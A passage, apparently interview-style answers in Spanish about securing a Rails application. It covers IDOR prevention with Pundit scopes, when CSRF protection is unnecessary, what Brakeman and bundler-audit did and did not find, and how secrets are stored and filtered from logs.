email** contra el ataque distribuido de un botnet contra una sola cuenta — y un
mensaje de error idéntico en los dos casos.

**3. "¿Cómo prevenís IDOR en Rails?"**

Dos controles, y hacen falta los dos. `authorize @record` (Pundit) contesta
"¿este usuario puede tocar **este** objeto?" y devuelve 403. `policy_scope(Model)`
hace que la búsqueda **arranque** de lo que el usuario puede ver, así que un id
ajeno da 404. Prefiero `policy_scope` para el lookup: el 404 no confirma que el
recurso existe, y si te olvidás una condición el objeto simplemente no aparece,
en vez de aparecer y depender de un chequeo posterior.

El otro pilar es **deny-by-default**: en la app que armé, el `Scope` base de
`ApplicationPolicy` devuelve `scope.none` y los helpers usan `user&.active?`, así
que sin usuario, o con usuario desactivado, no se ve nada. Y una red de
seguridad: `after_action :verify_authorized` (con `verify_policy_scoped` para
`index`), que en dev/test explota si te olvidaste de autorizar y en producción
loguea un evento de seguridad. Eso es lo que evita el agujero clásico de
"endpoint nuevo sin control de acceso".

*Trade-off:* Pundit no es automático como `@PreAuthorize` de Spring — olvidarse
es posible. El `verify_authorized` compensa parte de eso, pero es disciplina de
equipo, no una garantía del framework.

**4. "¿Cuándo desactivarías la protección CSRF?"**

Cuando la autenticación **no** es una cookie. CSRF existe porque el browser
adjunta la cookie de sesión sola, aunque la request la origine otro sitio. Con
`Authorization: Bearer`, el browser no adjunta nada, así que no hay ataque y el
token no aporta.

En la práctica no lo "desactivo": la API hereda de `ActionController::API`, que
directamente **no carga** el módulo de CSRF, ni cookies, ni flash, ni vistas.
Menos memoria por request y menos superficie.

Lo que nunca hago es `skip_forgery_protection` en un controller con sesión de
cookie porque "el fetch daba 422". El arreglo ahí es mandar el token en
`X-CSRF-Token`, no sacar la defensa. Y `SameSite=Lax` en la cookie es la segunda
capa — pero **no reemplaza** el token: un subdominio comprometido es same-site,
así que la cookie viaja igual.

**5. "Corriste Brakeman. ¿Qué encontró y qué NO encuentra?"**

Con el set por defecto: **0 warnings** sobre 20 controllers, 22 modelos y 34
templates, en 1.3 segundos, sin archivo de ignores. Con `-A` (todos los checks
opcionales): **3**.

El importante es `ForceSSL` — `config.force_ssl` comentado en producción, que
significa sin HSTS, sin redirect a HTTPS y **sin flag `secure` en las cookies**.
Verdadero positivo, arreglo de una línea.

Los otros dos son `UnscopedFind` (confianza Weak) sobre
`Session.find_by(id: cookies.signed[:session_id])`. Como IDOR es **falso
positivo**: el id sale de una cookie firmada con `secret_key_base`, no de
`params`. Pero fui a mirar la línea igual y encontré un bug real por otro
motivo: es `find_by` y no `active.find_by`, así que **una sesión vencida sigue
autenticando**. Lo verifiqué creando una sesión con `expires_at` de hace 10 días
y sigue resolviendo. Un analizador estático no es un oráculo; es un generador de
preguntas.

Lo que Brakeman **no** encuentra: lógica de autorización rota, IDOR real en un
modelo multi-tenant, race conditions, y bugs de negocio. Tampoco vio la CSP
ausente (no hay check) ni que `Pagy::DEFAULT[:max_limit]` sea una opción que la
gema no lee, con lo cual la API no tiene techo de paginación. Los dos son
"configuración que parece puesta", y ningún análisis estático los ve. Cero
warnings no es "app segura".
Va con bundler-audit (que acá dio **0 vulnerabilidades** contra 1237 avisos de
la Ruby Advisory DB) y Dependabot, que en este repo también cubre
`github-actions` — que es el ecosistema que todos se olvidan y que corre con
los secretos del repo.

**6. "¿Dónde guardás los secretos?"**

Dos lugares con criterios distintos. **Credentials encriptadas**
(`config/credentials.yml.enc`, AES-128-GCM) para el secreto raíz —
`secret_key_base`— porque tiene que estar disponible al bootear, cambia poco y
queda versionado con el código, o sea auditable en git. La `master.key` **nunca**
se commitea (`.gitignore`: `/config/*.key`), llega por `RAILS_MASTER_KEY`.
Detalle que se olvida: el build de la imagen usa `SECRET_KEY_BASE_DUMMY=1` para
precompilar assets, así que la master key **no** queda en una capa de Docker ni
en los logs de CI.

**Variables de entorno** para lo que cambia por entorno: `DATABASE_URL`,
`REDIS_URL`, secretos de webhook. `dotenv-rails` está sólo en `development, test`,
así que en producción vienen del orquestador.

*Trade-off:* las credentials no rotan sin deploy y no integran con Vault o AWS
Secrets Manager; las variables de entorno son visibles en `/proc` y en cualquier
dump de `ENV` que haga un error report. Para una app chica, credentials para el
secreto raíz y ENV para el resto es el punto correcto. A escala, todo va a un
gestor de secretos externo.

Y la parte que no es de almacenamiento: `filter_parameters` para que no lleguen
a los logs (acá filtra `passw`, `token`, `secret`, `_key`, `crypt`, `salt`,
`otp`, `ssn`, `cvv`, `cvc` **y `email`**, tratando el mail como PII), más
`attributes_for_inspect = [:id]` en producción, que es lo que evita que un
`user.inspect` en un error report dumpee el `password_digest`. Si un secreto
llegó a un commit: **primero se rota, después se limpia la historia**. En ese
orden — `git rm --cached` no borra nada de los clones que ya existen.
